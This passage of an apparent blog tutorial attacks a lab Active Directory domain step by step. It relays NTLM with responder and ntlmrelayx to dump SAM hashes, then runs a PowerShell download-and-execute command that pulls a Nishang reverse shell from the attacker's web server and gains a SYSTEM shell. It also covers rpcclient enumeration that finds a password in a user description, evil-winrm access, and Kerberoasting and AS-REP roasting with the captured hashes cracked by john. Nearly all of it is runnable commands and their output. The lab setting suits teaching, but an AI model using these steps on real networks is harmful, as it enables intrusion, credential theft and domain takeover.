SMB         192.168.0.149   445    RAMLUX-PC        [*] Windows 10.0 Build 19041 x64 (name:RAMLUX-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.116   445    SPONCE-PC        [*] Windows 10.0 Build 19041 x64 (name:SPONCE-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [*] Windows 10.0 Build 17763 x64 (name:WIN-FV8S9VU238J) (domain:ruycr4ft.local) (signing:True) (SMBv1:False)
SMB         192.168.0.109   445    SARA             [*] Windows 10.0 Build 19041 x64 (name:SARA) (domain:SARA) (signing:False) (SMBv1:False)
```

Ok, so now we see our target IP: 192.168.0.149
Let's save it into a file:

![](/assets/img/AD/4.png)

Now we will fire up `responder`:

```zsh
❯ responder -I wlan0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.0.106]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-FNJO9M3RFSM]
    Responder Domain Name      [BRLS.LOCAL]
    Responder DCE-RPC Port     [48876]

[+] Listening for events...
```

Now, we will start `ntlmrelayx`:

```zsh
❯ python3 ntlmrelayx.py -tf target -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Because `sponce` has privileges over `ramlux`, we can take advantage of that to access to a non-existing resource and look what happens:

![](/assets/img/AD/5.png)

Now, check out your `ntlmrelayx`!

```zsh
❯ python3 ntlmrelayx.py -tf target -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Connection from RUYCR4FT/SPONCE@192.168.0.116 controlled, attacking target smb://192.168.0.149
[*] Authenticating against smb://192.168.0.149 as RUYCR4FT/SPONCE SUCCEED
[*] SMBD-Thread-5 (process_request_thread): Connection from RUYCR4FT/SPONCE@192.168.0.116 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] SMBD-Thread-7 (process_request_thread): Connection from RUYCR4FT/SPONCE@192.168.0.116 controlled, but there are no more targets left!
[*] Target system bootKey: 0x9e439fee9a0f33d64ef508d183eafb2f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] SMBD-Thread-8 (process_request_thread): Connection from RUYCR4FT/SPONCE@192.168.0.116 controlled, but there are no more targets left!
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7b75aeef3ea91facb4cd29e7da7832d9:::
Ramlux:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Done dumping SAM hashes for host: 192.168.0.149
[*] Stopping service RemoteRegistry
```

This is cool, but we can do **cooler** things. Here we are dumping the `SAM`, but with `ntlmrelayx` we could execute commands on the target!
The goal is to access `RAMLUX-PC`, so to do that, you will need to follow the following steps:

First, clone the [nishang repository](https://github.com/samratashok/nishang).
Now, go to `Shells` directory and copy the `Invoke-PowerShellTcp.ps1` to your working directory.

```zsh
❯ cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
                                                                                       
❯ mv Invoke-PowerShellTcp.ps1 PS.ps1
```

After that, in the last line of the script, add this line with your IP and port:

![](/assets/img/AD/6.png)

Then, run a python web server:

```zsh
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

And listen with `netcat`...

```zsh
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

Now, start `responder` again:

```zsh
❯ responder -I wlan0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlan0]
    Responder IP               [192.168.0.106]
    Responder IPv6             [fe80::1726:b490:48e1:fe89]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-GSAPAVAME65]
    Responder Domain Name      [8DXY.LOCAL]
    Responder DCE-RPC Port     [49327]

[+] Listening for events...
```

Start `ntlmrelayx`...

```zsh
❯ python3 ntlmrelayx.py -tf target -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.106:8080/PS.ps1')"
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

And now, in `sponce` machine, access a non-existing resource:

![](/assets/img/AD/7.png)

Now, if you check our `ntlmrelayx`, you will see something like this:

```zsh
❯ python3 ntlmrelayx.py -tf target -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.0.106:8000/PS.ps1')"
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Connection from RUYCR4FT/SPONCE@192.168.0.116 controlled, attacking target smb://192.168.0.149
[*] Authenticating against smb://192.168.0.149 as RUYCR4FT/SPONCE SUCCEED
[*] SMBD-Thread-5 (process_request_thread): Connection from RUYCR4FT/SPONCE@192.168.0.116 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
```

But, if you check your `netcat` listener:

```zsh
❯ rlwrap nc -lvnp 4646
listening on [any] 4646 ...
connect to [192.168.0.106] from (UNKNOWN) [192.168.0.149] 49788
Windows PowerShell running as user RAMLUX-PC$ on RAMLUX-PC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\system
PS C:\Windows\system32> 
```

We gained a `reverse shell` as `nt authority\system` on RAMLUX-PC!!!

# Grabbing info from users

- - -

There are some times when a user puts something sensitive information on their user description, such as passwords, emails, etc. Us, as attackers, we need to enumerate **everything**.
If the `rpcclient` null session is available, you must turn it off **now**. If its not available, thats ok, but if an attacker gets credentials...

Here there is a user called `sromero` that has a pretty sensitive description:

```zsh
❯ rpcclient -U 'ruycr4ft.local\sponce%Password2' 192.168.0.115 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x'
[Administrator]
[Guest]
[krbtgt]
[ramlux]
[sponce]
[sromero]
```

And these are the user's `rid`:

```zsh
❯ rpcclient -U 'ruycr4ft.local\sponce%Password2' 192.168.0.115 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'
0x1f4
0x1f5
0x1f6
0x44f
0x452
0x454
```

With this regex we can see all the user's info:

```zsh
❯ for rid in $(rpcclient -U 'ruycr4ft.local\sponce%Password2' 192.168.0.115 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'); do echo -e "\n[+] For the RID $rid:\n"; rpcclient -U 'ruycr4ft.local\sponce%Password2' 192.168.0.115 -c "queryuser $rid" | grep -E -i "user name|description" ;done

[+] For the RID 0x1f4:

	User Name   :	Administrator
	Description :	Built-in account for administering the computer/domain

[+] For the RID 0x1f5:

	User Name   :	Guest
	Description :	Built-in account for guest access to the computer/domain

[+] For the RID 0x1f6:

	User Name   :	krbtgt
	Description :	Key Distribution Center Service Account

[+] For the RID 0x44f:

	User Name   :	ramlux
	Description :	

[+] For the RID 0x452:

	User Name   :	sponce
	Description :	

[+] For the RID 0x454:

	User Name   :	sromero
	Description :	Temporal Password: Mypassword123#
```

We can see that the user `sromero` has a **very sensitive** description!!
Let's try to connect with `evil-winrm` to see our permissions:

```zsh
❯ evil-winrm -i 192.168.0.115 -u sromero -p 'Mypassword123#'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sromero\Documents> whoami
ruycr4ft\sromero
*Evil-WinRM* PS C:\Users\sromero\Documents> 
```

![](/assets/img/AD/damn.gif)

We've been able to connect to the DC as `sromero`!!!
I will leave you a link in which explains [WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) connections.

## Enumerating Admin groups

- - -

This is one of the top 10 things you should do if you have credentials or a null session with `rpcclient`, enumerate all admin users in search of sensitive info:

```zsh
❯ rpcclient -U 'ruycr4ft.local\sponce%Password2' 192.168.0.115
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient $> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
	rid:[0x454] attr:[0x7]
	rid:[0x455] attr:[0x7]
rpcclient $> queryuser 0x1f4
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	jue, 25 may 2023 17:36:49 CEST
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 14 sep 30828 04:48:05 CEST
	Password last set Time   :	mar, 23 may 2023 16:39:28 CEST
	Password can change Time :	mié, 24 may 2023 16:39:28 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000020
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> queryuser 0x454
	User Name   :	sromero
	Full Name   :	Sabina Romero
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Temporal Password: Mypassword123#
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	jue, 01 ene 1970 01:00:00 CET
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 14 sep 30828 04:48:05 CEST
	Password last set Time   :	jue, 25 may 2023 17:11:24 CEST
	Password can change Time :	vie, 26 may 2023 17:11:24 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x454
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> queryuser 0x455
	User Name   :	svc_sql
	Full Name   :	SVC_SQLService
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	jue, 01 ene 1970 01:00:00 CET
	Logoff Time              :	jue, 01 ene 1970 01:00:00 CET
	Kickoff Time             :	jue, 14 sep 30828 04:48:05 CEST
	Password last set Time   :	jue, 25 may 2023 17:45:40 CEST
	Password can change Time :	vie, 26 may 2023 17:45:40 CEST
	Password must change Time:	jue, 14 sep 30828 04:48:05 CEST
	unknown_2[0..31]...
	user_rid :	0x455
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient $> 
```

This would be a way, but another way to see this info more organized would be with [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump).

# LDAP Enumeration

- - -

```zsh
❯ service apache2 start
                                                                                                                                                                                                                                
❯ python3 /opt/ldapdomaindump/ldapdomaindump.py -u 'ruycr4ft.local\sponce' -p 'Password2' 192.168.0.115
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
                                                                                                                                                                                                                                
❯ ls
domain_computers_by_os.html  domain_computers.html  domain_groups.grep  domain_groups.json  domain_policy.html  domain_trusts.grep  domain_trusts.json          domain_users.grep  domain_users.json
domain_computers.grep        domain_computers.json  domain_groups.html  domain_policy.grep  domain_policy.json  domain_trusts.html  domain_users_by_group.html  domain_users.html
```

Now we can access to our [localhost](http://127.0.0.1) to see everything more clearly:

![](/assets/img/AD/11.png)

# Kerbrute

- - -

Kerbrute is an useful tool to enumerate domain users via `kerberos`. You can install it in a debain-based linux with `apt-get install kerbrute`.
To enumerate the users it will be something like this:

```zsh
❯ ./kerbrute userenum users --dc dc.ruycr4ft.local -d ruycr4ft.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/25/23 - Ronnie Flathers @ropnop

2023/05/25 19:54:40 >  Using KDC(s):
2023/05/25 19:54:40 >  	dc.ruycr4ft.local:88

2023/05/25 19:54:40 >  [+] VALID USERNAME:	ramlux@ruycr4ft.local
2023/05/25 19:54:40 >  [+] VALID USERNAME:	svc_sql@ruycr4ft.local
2023/05/25 19:54:40 >  [+] VALID USERNAME:	sponce@ruycr4ft.local
2023/05/25 19:54:40 >  [+] VALID USERNAME:	Administrator@ruycr4ft.local
2023/05/25 19:54:40 >  [+] VALID USERNAME:	sromero@ruycr4ft.local
2023/05/25 19:54:40 >  Done! Tested 7 usernames (5 valid) in 0.033 seconds
```

The `users` file was a costum file, but you can use one from `SecLists`.

# Kerberoasting

- - -

Kerberoasting is a technique that we can use to target service accounts in a Windows Active Directory environment. It takes advantage of the way Kerberos authentication works for services that use Kerberos to obtain service tickets.

Here's how Kerberoasting works:

- We start by identifying service accounts in the Active Directory environment. These service accounts are typically used to run various services or applications.

- Next, we query the Active Directory for service accounts that have associated Service Principal Names (SPNs). SPNs uniquely identify services registered in the domain.

- Once we have a list of service accounts with SPNs, we request a service ticket (TGS) for each of these accounts. We do this by using our regular user account and providing the SPN of the service account we want to target.

- The domain controller issues a service ticket encrypted with the service account's password, which we do not know.

- We extract the encrypted service tickets and save them to a file.

- Now, we can use a tool like `john` to offline brute force the service account's password and obtain the plaintext password. `john` performs a dictionary or brute force attack against the encrypted service ticket to crack the password.

With the plaintext password in our possession, we can potentially access other systems or services that use the same credentials. This can lead to further privilege escalation and lateral movement within the network.

For this attack we need to know **any** password of **any** user.
We will use `impacket-GetSPNs`:

```zsh
❯ impacket-GetUserSPNs ruycr4ft.local/sponce:Password2
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                    Name     MemberOf                                                      PasswordLastSet             LastLogon  Delegation 
--------------------------------------  -------  ------------------------------------------------------------  --------------------------  ---------  ----------
ruycr4ft.local/svc_sql.WIN-FV8S9VU238J  svc_sql  CN=Group Policy Creator Owners,CN=Users,DC=ruycr4ft,DC=local  2023-05-25 17:45:40.182610  <never>               
```

Perfect! It worked with `sponce`. Now I am going to prove you that this could be performed with **any user's credentials**:

```zsh
❯ impacket-GetUserSPNs ruycr4ft.local/sromero:Mypassword123#
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                    Name     MemberOf                                                      PasswordLastSet             LastLogon  Delegation 
--------------------------------------  -------  ------------------------------------------------------------  --------------------------  ---------  ----------
ruycr4ft.local/svc_sql.WIN-FV8S9VU238J  svc_sql  CN=Group Policy Creator Owners,CN=Users,DC=ruycr4ft,DC=local  2023-05-25 17:45:40.182610  <never>               
```

It worked too with `sromero`.
Now, with the `-request` parameter we will request a `Ticket Granted Service`:

```zsh
❯ impacket-GetUserSPNs ruycr4ft.local/sponce:Password2 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                    Name     MemberOf                                                      PasswordLastSet             LastLogon  Delegation 
--------------------------------------  -------  ------------------------------------------------------------  --------------------------  ---------  ----------
ruycr4ft.local/svc_sql.WIN-FV8S9VU238J  svc_sql  CN=Group Policy Creator Owners,CN=Users,DC=ruycr4ft,DC=local  2023-05-25 17:45:40.182610  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_sql$RUYCR4FT.LOCAL$ruycr4ft.local/svc_sql*$2c96d610678cfd87f24250d68db8087d$06f3d94af90acf738c93783b7496fcc9f9b1414242eb0b9722178db43b895dd7bd1f07952e7e4d65d11387db194b912fb60a9188b69396f6bd79273b2ecee453856e0df06cd1b2f23a4d0af5edf965c974e0d581fea7afbef6df7e94827fe972fa49fb9d3b9692217eb60bb4c1547125827c09a691445a0433bcdbe4f6760a88d30982f501276a98344393eb9874980fbcbd7a7211b2c70d0929a3124219781bffb363884013998de780565e9a14e1961afb04a0de808d4bc963e63432a5374b82114957992fb2b7685e7c8a8399ef89ed04573a465acf11308cbef05d8962beea2b3289fb92a1cd83b9fdbe45631a9150d7754dc56e833da4d30a76c58124db62a2a799849783ab81f9f73c2784a178e7f7f248e1fcf31040c9da328e4ba974cd25e0d54b957d273722a90ab81e86698f105aaba570194757a61d4ed66dd108f65c1f003fd7d812ef522c8485597d3bc2e7f227106e5e469b27a01f345d6dca9fa7657701aa7a3993c2174851b62636d66a94e4b5d21abf45f6f518bbb8e3c02444674354ca13b820c97b176874dec44c619d5152f5f42beb60f9ac1713574c3a51e38929f923207cc4e20e5bd2d03113a0dd5fe15f1ab88fa3aa72af52e64711e3ce2f130ed754393ab0bf0d9b1e109d827aa00dba8cd9c2844be5e84740a1e89b6de79d39dc35caa03d3bd2beae55226786696000ab64c03f3059842929d0f4e14c87605ef0360dba3b2aa15b0a3bbd6cf2b082c096cb99fd0775a9ceda70f7a15e6a3db2646ece1780cc6968c3a4c5c0cda1492f86cf74421084f4fa1a64fa87fc3528517e417e93ae999c4496d6108a3ddd04fa97fd317f8eb376ccd83cd023850240fb4ef0aa55346941f7b7b7b375c5c8b19da86969c1105d220b02887a89b05a6ea072368e2a9e838b09a25792de09fe2c908bf8da778eb25fb5feff431aaa17884ecb1f5602fef3b4960c01768af06ec0c8dc91cdffb43e988af60953b9ee2a0396b23ac968d8d747860a0f5c8e8254df90197fa784d04f458bef30f032c445eca51c048b440663de2d8fd8b4a7b6fbbfeec47578040be4829562374a72e4c35d27c7b789f9e590ac273050820a28111ad5fb91c0c8f572a48311c291b6935cf005c15155eb10ecab80c3264b4b4f6f94dbcb2a8008c65d508007fbd0dd05114edfdecda0bc1b5bdd89580ee63759a316e48307d67e7df245cd577eea19538741382c8c0a97ee25f81a75ed283ed42f99b23231bcadce7f6837854e35811d330a3eb8ca24ff6eee9678d5a4ebe1b7c4c5cad408f55362897a429ecce30638122839a74996873a77272f5a27d5b99fd5c1766676abb35ac4eb1265e6e987abc3123349badfb4288aea016be77c449449c130e48b5c910755b6a843538b0e37fd146c7fb60cd1600001a4c4e583dbe44b45b32323b72f0abcbe892ed32346702a939422bca891d7cb1ae88d006b8bb40c6506705bf98bda5a111d48e9205f5235ceb5bbee94fe0d1f661cefd929a10f18e36d10c0c2c6b5f9a748f8dc6e878268803ddea7991228401a94009f3697436930b58e29c590dc9d79c2550959de4d0a989edf194584b3e363759bdd2fe887d615c299226a0e3c13f1e2ce584fd4aa5598bc54554291aaeadf4e
```

Great! Now, we will try to crack this hash using `John The Ripper`:

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mypassword123# (?)
0g 0:00:00:25 DONE (2023-05-25 18:26) 0g/s 559428p/s 559428c/s 559428C/s !!12Honey..*7¡Vamos!
Session completed.
```


Great! Now, with `crackmapexec` we culd see if this user has Admin privileges:

```zsh
❯ cme smb 192.168.0.1/24 -u svc_sql -p 'Mypassword123#'
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [*] Windows 10.0 Build 17763 x64 (name:WIN-FV8S9VU238J) (domain:ruycr4ft.local) (signing:True) (SMBv1:False)
SMB         192.168.0.116   445    SPONCE-PC        [*] Windows 10.0 Build 19041 x64 (name:SPONCE-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.115   445    WIN-FV8S9VU238J  [+] ruycr4ft.local\svc_sql:Mypassword123# (Pwn3d!)
SMB         192.168.0.116   445    SPONCE-PC        [+] ruycr4ft.local\svc_sql:Mypassword123# (Pwn3d!)
SMB         192.168.0.149   445    RAMLUX-PC        [*] Windows 10.0 Build 19041 x64 (name:RAMLUX-PC) (domain:ruycr4ft.local) (signing:False) (SMBv1:False)
SMB         192.168.0.149   445    RAMLUX-PC        [+] ruycr4ft.local\svc_sql:Mypassword123# (Pwn3d!)
```

Perfect!! So this user is an admin, DC pwned!

# AS-REP Roast

- - -

This kind of attack search for users without `Kerberos pre-auth` required. 
That means that you can send a `AS_REQ` to `ruycr4ft.local` with a list of users, reciving an `AS_REP` message. This message contains a hash of the user's password. With this password, we could try to crack it offline.

To perform this attack, we will firts create a list of users

```zsh
❯ rpcclient -U 'ruycr4ft.local\sponce%Password2' 192.168.0.115 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > users
                                                                                                                                                                                                                                
❯ cat users
   1   │ Administrator
   2   │ Guest
   3   │ krbtgt
   4   │ ramlux
   5   │ sponce
   6   │ sromero
   7   │ svc_sql
```

Now that we have a `users` file, let's use `impacket-GetNPUsers`:

```zsh
❯ impacket-GetNPUsers ruycr4ft.local/ -no-pass -usersfile users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ramlux doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$sponce@RUYCR4FT.LOCAL:bf1356b316a8cc98ef0f70e0f2028e51$7a4020b832ea1841526e941a86df02799a70cd8e1388451a003ce5cacf37e0bb273aa316635c955818050780b0934d4866a324f98099c3b1fccdabc856379c1dfe8481c5e197fcc2edaecff13bc8963ec851a1cb27c43418dba35d11e45f3545f4cb6f617f461225e047093df563f76791cb902cdad18d1e1051512ddf71b63321bd766581c6992eb88034038de2573a780a14cd1317e1b9a6e510a6ffeb519ae61acb824b16b4cc82abb0b593ee97d304623970a655854bd51b3bf42dcddcc0cf148344e77ff05a2f4efc1dbc232cac5fd7d2c6d862036f2917d0cc1074af7a20eef01fa9e29d290e5900becca7f172
[-] User sromero doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_sql doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Here we can see that the user `sponce` is vulnerable to this kind of attack!! Now, we could try to crack this hash:

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password2        ($krb5asrep$23$sponce@RUYCR4FT.LOCAL)     
1g 0:00:00:00 DONE (2023-05-25 20:06) 10.00g/s 542720p/s 542720c/s 542720C/s soydivina..250984
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Great!! This attack was successfull!! This is one of the first attacks you should perform when you are trying to pwn a DC.

# Golden Ticket Attack

- - -

For this type of attack, we, as attackers, would need to exploit the Kerberos ticket authentication system, which is commonly used in corporate network environments. We would create a fake ticket with an extremely long validity period, known as a "Golden Ticket." To generate this forged ticket, we would require access to the domain account's encryption key, also referred to as the "domain account master key" or "domain encryption key." This key can be obtained by compromising a Windows domain controller and extracting it from the system's memory.

Once we have successfully created the Golden Ticket, we can utilize it to authenticate ourselves within the Kerberos system without the need for genuine user credentials. This attack would grant us full access and administrator privileges on the compromised network.

For this attack, we will use the following tools:

- Ticketer
- Rubeus
